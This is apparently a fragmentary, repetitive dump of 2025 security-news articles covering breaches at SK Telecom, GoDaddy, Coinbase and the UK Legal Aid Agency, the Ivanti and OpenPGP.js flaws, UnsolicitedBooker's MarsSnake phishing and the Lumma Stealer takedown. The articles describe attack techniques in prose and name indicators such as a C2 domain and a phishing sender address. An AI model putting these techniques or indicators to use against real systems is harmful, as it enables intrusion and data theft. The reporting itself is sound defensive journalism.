        "content": "날짜: May 21, 2025\n\n요약: Patching is basic cyber hygiene — but executing it at scale, securely, and fast? That's the real challenge. ThreatLocker's Patch Management flips the script with control, visibility, and Zero Trust workflows built for today's threat landscape.\n\n본문:\nPatching vulnerabilities is one of the most basic principles of cybersecurity — and one of the hardest to execute consistently and securely at scale.\n\nIn today’s threat landscape, adversaries routinely exploit vulnerabilities within hours of public disclosure. Yet, operational constraints, patch instability, and incomplete visibility into assets make it almost impossible for many organizations to patch fast enough without introducing new risks.\n\nThreatLocker Patch Management is built to tackle this reality head-on, providing security teams with greater control, visibility, and confidence over patching workflows — without compromising the stability of production systems.\n\nFor most organizations, patching is treated as a race against time. As soon as a critical CVE drops — whether it’s another Microsoft Exchange zero-day (think ProxyShell, CVE-2021-34473) or a remote code execution bug in Chrome — IT scrambles to deploy vendor patches as fast as possible.\n\nBut patching under pressure often introduces its own risks:\n\nIn fact, according to the 2023 Top Routinely Exploited Vulnerabilities (CISA), many breaches traced back to vulnerabilities that had patches available for months, or even years — a clear sign that it's not awareness that's lacking, but execution.\n\nEven fully patched apps can be exploited.\n\nThreatLocker Ringfencing™ controls what approved applications can access—like files, scripts, or the internet—stopping living-off-the-land attacks and preventing lateral movement before it starts\n\nThreatLocker flips the typical patching script by assuming that every change — even a vendor patch — must be treated as untrusted until verified.\n\nHere’s how it strengthens the process:\n\nBefore patches are made publicly available to organizations, it goes through an internal round of review and testing. ThreatLocker Application Engineers are the ones that make this possible. The team leverages the use of built-in applications, which are a repository of over 8000 applications that are commonly used. This gives security teams the foundation needed for a modern patch management solution. Here’s their approach:\n\nWhen CVE-2023-23397 — a zero-click vulnerability in Microsoft Outlook — was disclosed, it sent security teams scrambling. \nAttackers could trigger authentication leaks simply by sending a specially crafted email — no user interaction needed.\n\nOrganizations relying on traditional patch management workflows ran into immediate problems:\n\nThreatLocker users, however, were positioned to respond faster:\n\nInstead of days of scrambling, ThreatLocker customers were able to mitigate the risk window within hours — maintaining both system uptime and security integrity.\n\nThreatLocker Patch Management isn’t just about automating updates — it’s about giving security teams the tools they need to:\n\nIn an era where adversaries move faster than ever — leveraging automation, AI, and zero-day brokers — organizations can't afford manual, ad hoc patching practices.\n\nPrecision patch management is no longer a \"nice to have\" — it’s a core part of a modern cyber defense strategy.\n\nPatching is often called \"basic cyber hygiene,\" but in practice, doing it right is anything but simple. ThreatLocker Patch Management brings clarity, control, and speed to a process that has historically been riddled with risk and uncertainty.\n\nFor organizations serious about security, patch management must move beyond compliance checkboxes — it must become a strategic, security-first process.\n\nThreatLocker helps make that possible.\n\nLearn more about ThreatLocker Patch Management.\n\nSponsored and written by ThreatLocker.",

However, the crypto exchange said it would not pay the ransom but would establish a $20 million reward fund for tips that could help find the attackers who coordinated this attack and bring them to justice.\n\nWhile Coinbase is still assessing the breach's financial impact and the number of customers who were tricked into sending funds to the attackers in follow-up social engineering attacks is still unknown, the company said the resulting expenses will likely be \"within the range of approximately $180 million to $400 million\" for remediation and customer refunds.\n\n\"Coinbase will voluntarily reimburse retail customers who mistakenly sent funds to the scammer as a direct result of this incident prior to the date of this post, following a review to confirm the facts,\" the company said.\n\nCoinbase advises customers to be cautious of scammers impersonating their employees, who may try to obtain funds or sensitive information like passwords or 2FA codes. If approached, hang up, as Coinbase will never ask for account details over the phone.

Microsoft has simply given us no other option.\"\n\nSignal's screen security might cause issues with screen readers, so those who want to turn it off can do so from Signal Settings > Privacy > Screen security.\n\nSignal will also show an alert before turning off screen security, warning that Windows can take screenshots of their Signal chats once the feature is disabled.\n\n\"Apps like Signal have essentially no control over what content Recall is able to capture, and implementing 'DRM' that works for you (not against you) is the best choice that we had,\" Lund added.\n\n​\"We hope that the AI teams building systems like Recall will think through these implications more carefully in the future. Apps like Signal shouldn't have to implement 'one weird trick' in order to maintain the privacy and integrity of their services without proper developer tools. People who care about privacy shouldn't be forced to sacrifice accessibility upon the altar of AI aspirations either.\"\n\nHowever, as Lund added, enabling Signal's screen security on your device will not protect against screenshots or recordings by others using screen readers on macOS or Linux devices.\n\nIn April, almost one year after its introduction, Microsoft started rolling out Windows Recall to all customers who installed the Windows 11 KB5055627 update on Copilot+ PCs.\n\nOne month later, the company made it generally available to everyone who installed the May 2025 Patch Tuesday updates.\n\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\n\nWindows 11's Recall AI is now rolling out on Copilot+ PCs\n\nWindows 11 and Red Hat Linux hacked on first day of Pwn2Own\n\nWindows 11 upgrade block lifted after Safe Exam Browser fix\n\nMicrosoft: Windows 11 24H2 now ready to rollout to everyone\n\nMicrosoft Teams will soon block screen capture during meetings",

The FTC found that GoDaddy was unaware of vulnerabilities in its hosting environment due to a lack of standard security measures.\n\nThe FTC's order prohibits the company from misleading customers about its security protections and mandates GoDaddy to establish a robust information security program, secure APIs using HTTPS or other secure transfer protocols, and set up a software and firmware update management program.\n\nThe order also requires GoDaddy to hire an independent third-party assessor to conduct biennial reviews of its information security program and report any incident where customer data was exposed, accessed, or stolen within 10 days.\n\nAmong other requirements, the hosting company has to add at least one mandatory MFA for all customers, employees, and contractors' staff \"to any Hosting Service supporting tool or asset, including connecting to any database\" and \"at least one method that does not require the customer to provide a telephone number, such as by integrating authentication applications or allowing the use of security key.\"\n\nAccording to the FTC's complaint, GoDaddy had inadequate security practices, lacking multi-factor authentication (MFA), proper software update management, and logging of security events. It also failed to monitor for threats, segment its network, use file integrity monitoring, keep track of and manage its assets, assess risks to its hosting services, or secure service connections to consumer data.\n\nThe FTC says these security failures led to several major security breaches between 2019 and 2022, resulting in attackers gaining access to customers' data and websites. For instance, in February 2023, GoDaddy revealed that unknown threat actors installed malware on compromised servers and stole source code after breaching its cPanel shared hosting environment in a multi-year breach.\n\nThe company discovered the incident in early December 2022, only after receiving customer complaints that their websites were being abused to redirect to unknown domains. GoDaddy also disclosed at the time that breaches disclosed in March 2020 and November 2021 were linked to the same campaign.\n\nIn the November 2021 breach, attackers hacked into GoDaddy's hosting environment using a compromised password and stole email addresses, WordPress Admin passwords, sFTP and database credentials, and SSL private keys of 1.2 million Managed WordPress customers. Following the March 2020 breach, GoDaddy notified 28,000 customers that an attacker used their web hosting credentials to connect via SSH in October 2019.\n\n\"We are constantly improving our security capabilities and have already implemented a number of the requirements in the settlement agreement with the FTC. Notably, the resolution of this matter includes no admission of fault and no monetary penalties,\" GoDaddy told BleepingComputer in January when the FTC issued a proposed settlement order.\n\n\"We expect minimal financial impact associated with complying with the terms of the agreement with the FTC.

He commented on the hackers’ deep knowledge about Ivanti systems saying that they know which files hold the information required for the next step of the attack, such as cleartext MySQL credentials, and targeting those specifically.\n\nThe entities targeted in the latest UNC5221 exploitation campaign are:\n\nThese were confirmed breaches, as evidenced by reverse shells, data exfiltration/database exports, persistent malware injections, and abuse of internal Office 365 tokens and LDAP configurations.\n\nBüyükkaya told BleepingComputer that based on the observed post-compromise activity, the threat actor was most likely engaged in espionage, monitoring high-value targets related to strategic interests.\n\nThe threat actor performed host reconnaissance by running system commands to gather details about the device, users, network, and configuration files, before dropping the KrystyLoader payload from a compromised AWS S3 bucket.\n\nThe output of those commands was temporarily saved as disguised .JPG files in a web-accessible directory, then immediately deleted to evade detection.\n\nThis indicates real-time data exfiltration, likely via HTTP GET requests, followed by artifact cleanup.\n\nThe EclecticIQ report also notes that the latest attacks conducted by UNC5221 feature links to the Linux backdoor ‘Auto-Color’ first reported by Palo Alto Networks’ Unit 42 in February but without clear attribution at the time.\n\nThe latest attacks indicate that Chinese espionage groups continue to target network perimeter devices for initial access into target organizations.\n\nThe exploitation that EclecticIQ observed started two days after the public disclosure, highlighting the criticality of applying security updates as soon as possible.\n\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\n\nIvanti patches Connect Secure zero-day exploited since mid-March\n\nNewest Ivanti SSRF zero-day now under mass exploitation\n\nIvanti zero-day attacks infected devices with custom malware\n\nIvanti Connect Secure zero-days exploited to deploy custom malware\n\nIvanti fixes EPMM zero-days chained in code execution attacks",

The FTC found that GoDaddy was unaware of vulnerabilities in its hosting environment due to a lack of standard security measures.\n\nThe FTC's order prohibits the company from misleading customers about its security protections and mandates GoDaddy to establish a robust information security program, secure APIs using HTTPS or other secure transfer protocols, and set up a software and firmware update management program.\n\nThe order also requires GoDaddy to hire an independent third-party assessor to conduct biennial reviews of its information security program and report any incident where customer data was exposed, accessed, or stolen within 10 days.\n\nAmong other requirements, the hosting company has to add at least one mandatory MFA for all customers, employees, and contractors' staff \"to any Hosting Service supporting tool or asset, including connecting to any database\" and \"at least one method that does not require the customer to provide a telephone number, such as by integrating authentication applications or allowing the use of security key.\"\n\nAccording to the FTC's complaint, GoDaddy had inadequate security practices, lacking multi-factor authentication (MFA), proper software update management, and logging of security events. It also failed to monitor for threats, segment its network, use file integrity monitoring, keep track of and manage its assets, assess risks to its hosting services, or secure service connections to consumer data.\n\nThe FTC says these security failures led to several major security breaches between 2019 and 2022, resulting in attackers gaining access to customers' data and websites. For instance, in February 2023, GoDaddy revealed that unknown threat actors installed malware on compromised servers and stole source code after breaching its cPanel shared hosting environment in a multi-year breach.\n\nThe company discovered the incident in early December 2022, only after receiving customer complaints that their websites were being abused to redirect to unknown domains. GoDaddy also disclosed at the time that breaches disclosed in March 2020 and November 2021 were linked to the same campaign.\n\nIn the November 2021 breach, attackers hacked into GoDaddy's hosting environment using a compromised password and stole email addresses, WordPress Admin passwords, sFTP and database credentials, and SSL private keys of 1.2 million Managed WordPress customers. Following the March 2020 breach, GoDaddy notified 28,000 customers that an attacker used their web hosting credentials to connect via SSH in October 2019.\n\n\"We are constantly improving our security capabilities and have already implemented a number of the requirements in the settlement agreement with the FTC. Notably, the resolution of this matter includes no admission of fault and no monetary penalties,\" GoDaddy told BleepingComputer in January when the FTC issued a proposed settlement order.\n\n\"We expect minimal financial impact associated with complying with the terms of the agreement with the FTC. We plan to continue to invest in our defenses to address evolving threats and help keep our customers, their websites and their data safe.\"\n\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.",

Microsoft has simply given us no other option.\"\n\nSignal's screen security might cause issues with screen readers, so those who want to turn it off can do so from Signal Settings > Privacy > Screen security.\n\nSignal will also show an alert before turning off screen security, warning that Windows can take screenshots of their Signal chats once the feature is disabled.\n\n\"Apps like Signal have essentially no control over what content Recall is able to capture, and implementing 'DRM' that works for you (not against you) is the best choice that we had,\" Lund added.\n\n​\"We hope that the AI teams building systems like Recall will think through these implications more carefully in the future. Apps like Signal shouldn't have to implement 'one weird trick' in order to maintain the privacy and integrity of their services without proper developer tools. People who care about privacy shouldn't be forced to sacrifice accessibility upon the altar of AI aspirations either.\"\n\nHowever, as Lund added, enabling Signal's screen security on your device will not protect against screenshots or recordings by others using screen readers on macOS or Linux devices.\n\nIn April, almost one year after its introduction, Microsoft started rolling out Windows Recall to all customers who installed the Windows 11 KB5055627 update on Copilot+ PCs.\n\nOne month later, the company made it generally available to everyone who installed the May 2025 Patch Tuesday updates.\n\nBased on an analysis of 14M malicious actions, discover the top 10 MITRE ATT&CK techniques behind 93% of attacks and how to defend against them.\n\nWindows 11's Recall AI is now rolling out on Copilot+ PCs\n\nWindows 11 and Red Hat Linux hacked on first day of Pwn2Own\n\nWindows 11 upgrade block lifted after Safe Exam Browser fix\n\nMicrosoft: Windows 11 24H2 now ready to rollout to everyone\n\nMicrosoft Teams will soon block screen capture during meetings",

The company offers cellular service, along with 5G development, AI services, IoT solutions, cloud computing, and smart city infrastructure.\n\nThe carrier is part of the larger SK Group, which is one of South Korea’s biggest conglomerates (also active in energy, semiconductors, chemicals, and more).\n\nIn April, SK Telecom reported that threat actors gained access to USIM-related information for customers following a malware attack. The Universal Subscriber Identity Module (USIM) is a smart card used in mobile devices, it securely stores subscriber information, including the International Mobile Subscriber Identity (IMSI) and cryptographic keys.\n\nThe telecom giant detected an infection of its systems at 11 PM on Saturday, April 19, 2025. Upon discovering the infection, the company promptly reported it to the Korea Internet & Security Agency (KISA) on Sunday, April 20, sanitized the impacted systems, and isolated the suspected hacking device. No cases of misuse of the information have been confirmed to date.\n\nSK Telecom announced it had enhanced defensive measures and blocked illegal SIM card changes and abnormal authentication attempts. The company is also offering impacted customers a subscription to the ‘SIM protection service’ for free.\n\nSK Telecom revealed that the security breach began in 2022, exposing USIM data of 27 million users. To counter SIM-swapping risks, it is replacing all SIM cards and enhancing security to block unauthorized number porting.\n\nOn May 8, 2025, the Personal Information Protection Committee found that malware compromised 25 types of data in the SK Telecom breach. SKT was instructed to notify all 25.64 million users, including budget phone users, by May 9. Leaked data includes phone numbers, IMSIs, SIM keys, and HSS-stored info.\n\n“The personal information that has been confirmed to have been leaked so far is a total of 25 types, including users’ mobile phone numbers, IMSI (subscriber identification number), SIM authentication keys, and other SIM-related information that were stored in HSS*.” states the Personal Information Protection Committee. “This measure was taken based on the committee’s judgment that the leaked information is important personal information that is used as a key means of identifying and connecting individuals in the mobile era, and therefore requires special attention.”\n\nSK Telecom announced it will notify 26.95 million users affected by a malware breach that exposed sensitive data. The firm found 25 malware types across 23 servers, revealing a far more extensive attack than expected.\n\n“We have isolated 25 types of malware discovered and 23 infected servers, and there has been no confirmation of leakage of 290,000 IMEIs, terminal cloning is virtually impossible, and the network is also blocked through FDS.” reads an update published by the company.\n\nA joint probe found the initial infection occurred on June 15, 2022, staying undetected for nearly three years.\n\n“The second investigation results additionally revealed that SKT did not notice that it had been infected with malicious code for nearly 3 years. The investigation team announced that after inspecting all 30,000 of SKT’s Linux servers four times, a total of 23 servers were infected with malicious code.” reported the website KBS. “The first malware infiltration occurred on June 15, 2022, and was confirmed to be a ‘web shell’ series code that took over the server. The investigation team said that the web shell code subsequently played a role in calling in difficult-to-detect backdoor (BPF door) series malware, and a total of 25 types of malware were found in SKT’s internal system.”\n\nSK Telecom ensures illegal USIM and device changes are fully blocked and pledges full responsibility if any damage still occurs.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, data breach)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nCybercrime\ndata breach\nHacking\nhacking news\ninformation security news\nIT Information Security\nmalware\nPierluigi Paganini\nSecurity Affairs\nSecurity News\nSK Telecom",

It allows developers to integrate secure end-to-end encryption features directly into web applications, browser extensions, or server-side tools using JavaScript.\n\nA critical flaw in OpenPGP.js versions 5.0.1 to 5.11.2 and 6.0.0 to 6.1.0 allows spoofing of inline-signed or signed+encrypted messages. Attackers can craft messages that return valid signature checks on data not actually signed, misleading recipients. Detached signatures are unaffected.\n\n“This flaw allows signature verifications of inline (non-detached) signed messages (using openpgp.verify) and signed-and-encrypted messages (using openpgp.decrypt with verificationKeys) to be spoofed, since both functions return extracted data that may not match the data that was originally signed. Detached signature verifications are not affected, as no signed data is returned in that case.” reads the advisory. “In order to spoof a message, the attacker needs a single valid message signature (inline or detached) as well as the plaintext data that was legitimately signed, and can then construct an inline-signed message or signed-and-encrypted message with any data of the attacker’s choice, which will appear as legitimately signed by affected versions of OpenPGP.js.”\n\nThe vulnerability allows attackers to alter inline-signed or signed+encrypted messages to contain any content, while still appearing to have a valid signature.\n\nResearchers Edoardo Geraci and Thomas Rinsma of Codean Labs discovered the vulnerability.\n\nThe issue is patched in 5.11.3 and 6.1.1, with workarounds available via manual signature checks.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, CVE-2025-47934)\n\nFACEBOOK \nLINKEDIN \nTWITTER",

        "content": "SK TELECOM REVEALED THAT MALWARE BREACH BEGAN IN 2022\nPierluigi Paganini\n \nMay 21, 2025\nSouth Korean mobile network operator SK Telecom revealed that the security breach disclosed in April began in 2022.\n\nSK Telecom is South Korea’s largest wireless telecom company, a major player in the country’s mobile and tech landscape.\n\nIt holds about 48% of the market share for mobile services, meaning around 34 million subscribers use its network. The company offers cellular service, along with 5G development, AI services, IoT solutions, cloud computing, and smart city infrastructure.\n\nThe carrier is part of the larger SK Group, which is one of South Korea’s biggest conglomerates (also active in energy, semiconductors, chemicals, and more).\n\nIn April, SK Telecom reported that threat actors gained access to USIM-related information for customers following a malware attack. The Universal Subscriber Identity Module (USIM) is a smart card used in mobile devices, it securely stores subscriber information, including the International Mobile Subscriber Identity (IMSI) and cryptographic keys.\n\nThe telecom giant detected an infection of its systems at 11 PM on Saturday, April 19, 2025. Upon discovering the infection, the company promptly reported it to the Korea Internet & Security Agency (KISA) on Sunday, April 20, sanitized the impacted systems, and isolated the suspected hacking device. No cases of misuse of the information have been confirmed to date.\n\nSK Telecom announced it had enhanced defensive measures and blocked illegal SIM card changes and abnormal authentication attempts. The company is also offering impacted customers a subscription to the ‘SIM protection service’ for free.\n\nSK Telecom revealed that the security breach began in 2022, exposing USIM data of 27 million users. To counter SIM-swapping risks, it is replacing all SIM cards and enhancing security to block unauthorized number porting.\n\nOn May 8, 2025, the Personal Information Protection Committee found that malware compromised 25 types of data in the SK Telecom breach. SKT was instructed to notify all 25.64 million users, including budget phone users, by May 9. Leaked data includes phone numbers, IMSIs, SIM keys, and HSS-stored info.\n\n“The personal information that has been confirmed to have been leaked so far is a total of 25 types, including users’ mobile phone numbers, IMSI (subscriber identification number), SIM authentication keys, and other SIM-related information that were stored in HSS*.” states the Personal Information Protection Committee. “This measure was taken based on the committee’s judgment that the leaked information is important personal information that is used as a key means of identifying and connecting individuals in the mobile era, and therefore requires special attention.”\n\nSK Telecom announced it will notify 26.95 million users affected by a malware breach that exposed sensitive data. The firm found 25 malware types across 23 servers, revealing a far more extensive attack than expected.\n\n“We have isolated 25 types of malware discovered and 23 infected servers, and there has been no confirmation of leakage of 290,000 IMEIs, terminal cloning is virtually impossible, and the network is also blocked through FDS.” reads an update published by the company.\n\nA joint probe found the initial infection occurred on June 15, 2022, staying undetected for nearly three years.\n\n“The second investigation results additionally revealed that SKT did not notice that it had been infected with malicious code for nearly 3 years. The investigation team announced that after inspecting all 30,000 of SKT’s Linux servers four times, a total of 23 servers were infected with malicious code.” reported the website KBS. “The first malware infiltration occurred on June 15, 2022, and was confirmed to be a ‘web shell’ series code that took over the server. The investigation team said that the web shell code subsequently played a role in calling in difficult-to-detect backdoor (BPF door) series malware, and a total of 25 types of malware were found in SKT’s internal system.”\n\nSK Telecom ensures illegal USIM and device changes are fully blocked and pledges full responsibility if any damage still occurs.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, data breach)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nCybercrime\ndata breach\nHacking\nhacking news\ninformation security news\nIT Information Security\nmalware\nPierluigi Paganini\nSecurity Affairs\nSecurity News\nSK Telecom",

The experts uncovered the attacks in March 2023 and again in 2024, noting that the group used spear-phishing emails with fake flight ticket lures to breach systems.\n\nUnsolicitedBooker has repeatedly targeted government organizations in Asia, Africa, and the Middle East, using spear-phishing emails to deliver malware. Their toolkit includes backdoors such as Chinoxy, DeedRAT, Poison Ivy, and BeRAT, commonly associated with Chinese APT groups.\n\nThe above backdoors are shared among multiple China-linked APT groups.\n\n“The group also deployed custom file stealers; therefore, we believe that the motivation of this threat actor is espionage and data theft. UnsolicitedBooker sends spearphishing emails, generally with a flight ticket as the decoy, and its targets include governmental organizations in Asia, Africa, and the Middle East.” reads the report published by ESET. “According to our investigation, UnsolicitedBooker overlaps with both Space Pirates and an unnamed threat actor that uses the Zardoor backdoor.”\n\nIn January 2025, UnsolicitedBooker launched another spearphishing attack against the same Saudi organization previously targeted. The phishing email, impersonating Saudia airline, came from saudia.etickets@outlook[.]com and included a fake flight ticket in a Word document, based on a PDF from Academia.edu.\n\nThe researchers observed that in 2024, UnsolicitedBooker reused the same ticket decoy from earlier attacks, embedding a VBA macro that drops a MarsSnake backdoor loader. The payload is saved as smssdrvhost.exe, and PDB paths confirm the MarsSnake name. The threat actors used the C&C server contact.decenttoy[.]top. Two more phishing attempts were also detected at the same target.\n\n“The multiple attempts at compromising this organization in 2023, 2024, and 2025 indicate a strong interest by UnsolicitedBooker in this specific target.” concludes the report.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, malware)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nbackdoor\nChina\nHacking\nhacking news\ninformation security news\nIT Information Security\nmalware\nMarsSnake\nPierluigi Paganini\nSecurity Affairs\nSecurity News\nUnsolicitedBooker",

It manages payments to legal professionals and supports vulnerable individuals, including asylum seekers and people in family or criminal cases.\n\nFollowing the cyberattack, the UK Legal Aid Agency acted swiftly to enhance system security and notified legal aid providers of a possible data breach. The Agency investigated the security breach with the help of the National Crime Agency and National Cyber Security Centre. On May 16, it was revealed that the breach was more extensive than initially believed, with hackers accessing and downloading sensitive personal data of legal aid applicants dating back to 2010. The agencies notified the authorities.\n\n“On Friday 16 May we discovered the attack was more extensive than originally understood and that the group behind it had accessed a large amount of information relating to legal aid applicants.” reads the update published by the agency. “We believe the group has accessed and downloaded a significant amount of personal data from those who applied for legal aid through our digital service since 2010.”\n\nDownloaded data may have included contact details and addresses of applicants, their dates of birth, national ID numbers, criminal history, employment status and financial data such as contribution amounts, debts and payments.\n\n“I understand this news will be shocking and upsetting for people and I am extremely sorry this has happened.\n\nSince the discovery of the attack, my team has been working around the clock with the National Cyber Security Centre to bolster the security of our systems so we can safely continue the vital work of the agency.” Jane Harbottle, Chief Executive Officer of the Legal Aid Agency, said. “However, it has become clear that to safeguard the service and its users, we needed to take radical action. That is why we’ve taken the decision to take the online service down.\n\nWe have put in place the necessary contingency plans to ensure those most in need of legal support and advice can continue to access the help they need during this time.”\n\nThe UK Legal Aid Agency has joined a growing list of high-profile victims in a recent surge of cyberattacks. Harrods, Marks & Spencer, and the Co-op were also targeted, facing system disruptions, financial losses, and operational setbacks.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, data breach)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nCybercrime\ndata breach\nHacking\ninformation security news\nIT Information Security\nLegal Aid Agency\nmalware\nPierluigi Paganini\nSecurity Affairs\nSecurity News",

It manages payments to legal professionals and supports vulnerable individuals, including asylum seekers and people in family or criminal cases.\n\nFollowing the cyberattack, the UK Legal Aid Agency acted swiftly to enhance system security and notified legal aid providers of a possible data breach. The Agency investigated the security breach with the help of the National Crime Agency and National Cyber Security Centre.

The experts uncovered the attacks in March 2023 and again in 2024, noting that the group used spear-phishing emails with fake flight ticket lures to breach systems.\n\nUnsolicitedBooker has repeatedly targeted government organizations in Asia, Africa, and the Middle East, using spear-phishing emails to deliver malware. Their toolkit includes backdoors such as Chinoxy, DeedRAT, Poison Ivy, and BeRAT, commonly associated with Chinese APT groups.\n\nThe above backdoors are shared among multiple China-linked APT groups.\n\n“The group also deployed custom file stealers; therefore, we believe that the motivation of this threat actor is espionage and data theft. UnsolicitedBooker sends spearphishing emails, generally with a flight ticket as the decoy, and its targets include governmental organizations in Asia, Africa, and the Middle East.” reads the report published by ESET. “According to our investigation, UnsolicitedBooker overlaps with both Space Pirates and an unnamed threat actor that uses the Zardoor backdoor.”\n\nIn January 2025, UnsolicitedBooker launched another spearphishing attack against the same Saudi organization previously targeted. The phishing email, impersonating Saudia airline, came from saudia.etickets@outlook[.]com and included a fake flight ticket in a Word document, based on a PDF from Academia.edu.\n\nThe researchers observed that in 2024, UnsolicitedBooker reused the same ticket decoy from earlier attacks, embedding a VBA macro that drops a MarsSnake backdoor loader. The payload is saved as smssdrvhost.exe, and PDB paths confirm the MarsSnake name. The threat actors used the C&C server contact.decenttoy[.]top. Two more phishing attempts were also detected at the same target.\n\n“The multiple attempts at compromising this organization in 2023, 2024, and 2025 indicate a strong interest by UnsolicitedBooker in this specific target.” concludes the report.\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, malware)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nbackdoor\nChina\nHacking\nhacking news\ninformation security news\nIT Information Security\nmalware\nMarsSnake\nPierluigi Paganini\nSecurity Affairs\nSecurity News\nUnsolicitedBooker",

        "content": "LAW ENFORCEMENT DISMANTLED THE INFRASTRUCTURE BEHIND LUMMA STEALER MAAS\nPierluigi Paganini\n \nMay 22, 2025\nMicrosoft found 394,000 Windows systems talking to Lumma stealer controllers, a victim pool that included global manufacturers.\n\nA US court order, with Europol and Japan’s JC3 dismantled the Lumma Stealer malware operation, seizing 2,300 domains used for command-and-control and blocking dark web markets offering the infostealer.\n\nA US court order, with Europol and Japan’s JC3, dismantled Lumma Stealer’s infrastructure, seizing domains and control panels. Microsoft’s Digital Crimes Unit sinkholed over 1,300 domains to reroute victims to safe servers for analysis and cleanup.\n\n“The Justice Department announced today the unsealing of two warrants authorizing the seizure of five internet domains used by malicious cyber actors to operate the LummaC2 information-stealing malware service.” reads the press release published by DoJ.\n\nLumma Stealer is a Malware-as-a-Service (MaaS) infostealer designed to steal sensitive data like passwords, credit card info, and crypto wallet keys. It infiltrates systems via phishing, malvertising, and malicious downloads. It can also deploy additional malware and evade detection.\n\nThe malware had infected over 394,000 Windows systems, including those of global manufacturers.\n\nMicrosoft observed Lumma Stealer’s rapid growth and sophistication as a MaaS used by financially motivated threat actors. Distributed via phishing, malvertising, and abuse of trusted platforms, Lumma targets browsers, wallets, and apps. Lumma’s flexibility and resilience highlight the evolving cybercrime landscape and the need for layered, collaborative defense efforts.\n\nMicrosoft tracks the developer of Lumma Stealer and its C2 infrastructure as threat actor Storm-2477. Ransomware groups like Octo Tempest, Storm-1607, Storm-1113, and Storm-1674 have used Lumma in their campaigns.\n\nLumma Stealer uses a layered C2 infrastructure with hardcoded tier 1 servers and fallback C2s via Telegram and Steam, all hidden behind Cloudflare. Telegram is prioritized, and Steam is used if others fail. Affiliates can pay for personal C2s. All communication is encrypted via HTTPS.\n\n“Different types of obfuscation are applied to each set of C2 servers. For example, the hardcoded list of C2s, and including the Telegram fallback C2 URL are protected with ChaCha20 crypto, while the Steam profile fallback C2 URL is encrypted using custom stack-based crypto algorithm that can change on each version of Lumma malware.” states Microsoft. “We have identified up to six versions of Lumma Stealer, and while each of these versions focuses on improving techniques to evade antivirus detections, there are also several changes in the C2 communication protocol and formats such as the C2 domains, URI path, POST data, and others. The core Lumma malware stores the build date as part of the embedded configuration to keep track of improvements, but in our investigation, we tracked major changes using the labels “version 1” through “version 6”.”\n\nThe FBI and US CISA also released a joint advisory that includes tactics, techniques, and procedures (TTPs) associated with Lumma Stealer along with indicators of compromise (IOCs).\n\n“Malware like LummaC2 is deployed to steal sensitive information such as user login credentials from millions of victims in order to facilitate a host of crimes, including fraudulent bank transfers and cryptocurrency theft,” said Matthew R. Galeotti, head of the Justice Department’s Criminal Division. “Today’s announcement demonstrates that the Justice Department is resolved to use court-ordered disruptions like this one to protect the public from the theft of their personal information and their assets. The Department is also committed to working with and appreciates the efforts of the private sector to safeguard the public from cybercrime.”\n\nFollow me on Twitter: @securityaffairs and Facebook and Mastodon\n\nPierluigi Paganini\n\n(SecurityAffairs – hacking, malware)\n\nFACEBOOK \nLINKEDIN \nTWITTER\nCybercrime\nHacking\nhacking news\ninformation security news\nIT Information Security\nLumma Stealer\nMaaS\nmalware\nPierluigi Paganini\nSecurity Affairs\nSecurity News",

        "content": "LAW ENFORCEMENT DISMANTLED THE INFRASTRUCTURE BEHIND LUMMA STEALER MAAS\nPierluigi Paganini\n \nMay 22, 2025\nMicrosoft found 394,000 Windows systems talking to Lumma stealer controllers, a victim pool that included global manufacturers.\n\nA US court order, with Europol and Japan’s JC3 dismantled the Lumma Stealer malware operation, seizing 2,300 domains used for command-and-control and blocking dark web markets offering the infostealer.\n\nA US court order, with Europol and Japan’s JC3, dismantled Lumma Stealer’s infrastructure, seizing domains and control panels. Microsoft’s Digital Crimes Unit sinkholed over 1,300 domains to reroute victims to safe servers for analysis and cleanup.\n\n“The Justice Department announced today the unsealing of two warrants authorizing the seizure of five internet domains used by malicious cyber actors to operate the LummaC2 information-stealing malware service.” reads the press release published by DoJ.\n\nLumma Stealer is a Malware-as-a-Service (MaaS) infostealer designed to steal sensitive data like passwords, credit card info, and crypto wallet keys. It infiltrates systems via phishing, malvertising, and malicious downloads. It can also deploy additional malware and evade detection.\n\nThe malware had infected over 394,000 Windows systems, including those of global manufacturers.\n\nMicrosoft observed Lumma Stealer’s rapid growth and sophistication as a MaaS used by financially motivated threat actors. Distributed via phishing, malvertising, and abuse of trusted platforms, Lumma targets browsers, wallets, and apps. Lumma’s flexibility and resilience highlight the evolving cybercrime landscape and the need for layered, collaborative defense efforts.\n\nMicrosoft tracks the developer of Lumma Stealer and its C2 infrastructure as threat actor Storm-2477. Ransomware groups like Octo Tempest, Storm-1607, Storm-1113, and Storm-1674 have used Lumma in their campaigns.\n\nLumma Stealer uses a layered C2 infrastructure with hardcoded tier 1 servers and fallback C2s via Telegram and Steam, all hidden behind Cloudflare. Telegram is prioritized, and Steam is used if others fail. Affiliates can pay for personal C2s. All communication is encrypted via HTTPS.\n\n“Different types of obfuscation are applied to each set of C2 servers. For example, the hardcoded list of C2s, and including the Telegram fallback C2 URL are protected with ChaCha20 crypto, while the Steam profile fallback C2 URL is encrypted using custom stack-based crypto algorithm that can change on each version of Lumma malware.” states Microsoft. “We have identified up to six versions of Lumma Stealer, and while each of these versions focuses on improving techniques to evade antivirus detections, there are also several changes in the C2 communication protocol and formats such as the C2 domains, URI path, POST data, and others. The core Lumma malware stores the build date as part of the embedded configuration to keep track of improvements, but in our investigation, we tracked 